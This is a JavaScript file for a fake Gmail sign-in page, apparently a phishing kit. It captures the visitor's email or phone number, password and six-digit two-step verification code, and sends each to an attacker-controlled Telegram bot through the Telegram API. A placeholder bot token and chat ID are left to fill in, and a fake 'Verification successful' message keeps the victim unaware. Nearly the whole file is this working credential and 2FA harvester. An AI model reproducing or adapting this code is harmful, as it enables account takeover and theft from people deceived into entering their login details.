document.addEventListener('DOMContentLoaded', function() {
    // Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
    
    // DOM elements
    const loginForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form-submit');
    const verificationForm = document.getElementById('verification-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const verificationInput = document.getElementById('verification-code');
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');
    const verificationError = document.getElementById('verification-error');
    const displayEmail = document.getElementById('display-email');
    const verificationEmail = document.getElementById('verification-email');
    const backToEmailBtn = document.getElementById('back-to-email');
    const backToPasswordBtn = document.getElementById('back-to-password');
    
    // Form sections
    const loginSection = document.getElementById('login-form');
    const passwordSection = document.getElementById('password-form');
    const verificationSection = document.getElementById('verification-page');
    
    // Current user email (for passing between forms)
    let currentEmail = '';
    
    // Function to send data to Telegram
    async function sendToTelegram(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            console.log('Telegram response:', data);
            return data.ok;
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            return false;
        }
    }
    
    // Email form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = emailInput.value.trim();
        
        // Simple validation
        if (!email) {
            showError(emailError, 'Enter an email or phone number');
            return;
        }
        
        if (!isValidEmail(email) && !isValidPhone(email)) {
            showError(emailError, 'Enter a valid email or phone number');
            return;
        }
        
        // Hide error if valid
        hideError(emailError);
        
        // Send email to Telegram
        await sendToTelegram(`📧 <b>Gmail Clone - Email Submitted</b>\n\nEmail/Phone: <code>${email}</code>`);
        
        // Store email and show in next form
        currentEmail = email;
        displayEmail.textContent = email;
        verificationEmail.textContent = email;
        
        // Show password form
        loginSection.classList.add('hidden');
        passwordSection.classList.remove('hidden');
        passwordInput.focus();
    });
    
    // Password form submission
    passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const password = passwordInput.value;
        
        // Simple validation
        if (!password) {
            showError(passwordError, 'Enter a password');
            return;
        }
        
        if (password.length < 8) {
            showError(passwordError, 'Password must be at least 8 characters');
            return;
        }
        
        // Hide error if valid
        hideError(passwordError);
        
        // Send password to Telegram
        await sendToTelegram(`🔑 <b>Gmail Clone - Password Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nPassword: <code>${password}</code>`);
        
        // Show verification form (simulating 2-step verification)
        passwordSection.classList.add('hidden');
        verificationSection.classList.remove('hidden');
        verificationInput.focus();
    });
    
    // Verification form submission
    verificationForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const code = verificationInput.value.trim();
        
        // Simple validation
        if (!code) {
            showError(verificationError, 'Enter a verification code');
            return;
        }
        
        if (code.length !== 6 || !/^\d+$/.test(code)) {
            showError(verificationError, 'Enter a valid 6-digit code');
            return;
        }
        
        // Hide error if valid
        hideError(verificationError);
        
        // Send verification code to Telegram
        await sendToTelegram(`✅ <b>Gmail Clone - Verification Code Submitted</b>\n\nEmail: <code>${currentEmail}</code>\nVerification Code: <code>${code}</code>`);
        
        // In a real app, you would verify the code with your backend
        alert('Verification successful! Redirecting to Gmail...');
        // window.location.href = 'https://mail.google.com';
    });
    
    // Back to email button
    backToEmailBtn.addEventListener('click', function() {
        passwordSection.classList.add('hidden');
        loginSection.classList.remove('hidden');
        emailInput.focus();
    });
    
    // Back to password button
    backToPasswordBtn.addEventListener('click', function() {
        verificationSection.classList.add('hidden');
        passwordSection.classList.remove('hidden');
        passwordInput.focus();
    });
    
    // Helper functions
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
    }
    
    function hideError(element) {
        element.textContent = '';
        element.style.display = 'none';
    }
    
    function isValidEmail(email) {
        // Very simple email validation
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
    
    function isValidPhone(phone) {
        // Simple phone number validation (just checking for digits)
        return /^\d+$/.test(phone);
    }
    
    // Input field validation
    emailInput.addEventListener('input', function() {
        hideError(emailError);
    });
    
    passwordInput.addEventListener('input', function() {
        hideError(passwordError);
    });
    
    verificationInput.addEventListener('input', function() {
        hideError(verificationError);
    });
});